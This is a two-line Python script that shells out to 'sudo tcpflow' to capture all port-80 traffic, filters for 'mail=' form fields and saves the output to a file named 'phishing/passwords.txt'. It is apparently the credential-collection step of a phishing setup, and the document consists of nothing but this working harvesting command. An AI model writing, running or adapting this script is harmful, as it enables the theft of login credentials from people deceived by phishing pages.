import os
os.system("sudo tcpflow -i any -C -g port 80 | grep -i mail= > phishing/passwords.txt")
